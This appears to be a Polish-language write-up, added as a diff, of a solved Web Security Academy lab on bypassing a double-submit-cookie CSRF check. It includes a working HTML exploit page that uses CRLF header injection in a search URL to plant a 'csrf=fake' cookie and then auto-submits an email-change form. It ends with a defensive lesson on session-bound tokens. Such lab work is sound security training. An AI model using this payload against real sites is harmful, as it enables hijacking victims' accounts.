@@ -1,0 +1,57 @@
+• Lab został rozwiązany przez obejście mechanizmu „double-submit cookie”.
+
+  Serwer sprawdzał tylko:
+
+  wartość parametru csrf == wartość ciasteczka csrf
+
+  Nie sprawdzał, czy token jest tajny, wygenerowany przez serwer ani związany z sesją. Dlatego użyłem
+  dowolnej wartości:
+
+  fake
+
+  Payload zapisany na exploit serverze:
+
+  <html>
+  <body>
+    <form action="https://0a060062038265d680a1bce400eb001a.web-security-academy.net/my-account/change-
+    email"
+          method="POST">
+      <input type="hidden"
+             name="email"
+             value="victim-519638@example.net">
+
+      <input type="hidden"
+             name="csrf"
+             value="fake">
+    </form>
+
+    <img
+      src="https://0a060062038265d680a1bce400eb001a.web-security-academy.net/?search=test%0d%0aSet-
+      Cookie:%20csrf=fake%3b%20SameSite=None"
+      onerror="document.forms[0].submit()">
+  </body>
+  </html>
+
+  Jak przebiega atak:
+
+  Ofiara otwiera exploit
+  → żądanie obrazka trafia do wyszukiwarki
+  → CRLF injection ustawia Cookie: csrf=fake
+  → odpowiedź nie jest obrazkiem, więc wykonuje się onerror
+  → formularz wysyła csrf=fake
+  → serwer widzi zgodność obu wartości
+  → przeglądarka dodaje sesję ofiary
+  → e-mail ofiary zostaje zmieniony
+
+  Fragment:
+
+  %0d%0aSet-Cookie:%20csrf=fake
+
+  po dekodowaniu oznacza:
+
+  Set-Cookie: csrf=fake
+
+  Najważniejsza lekcja: samo porównanie tokenu z ciasteczkiem jest niebezpieczne, jeżeli napastnik
+  potrafi ustawić to ciasteczko. Poprawny token powinien być nieprzewidywalny i bezpiecznie związany z
+  konkretną sesją użytkownika.
+ 
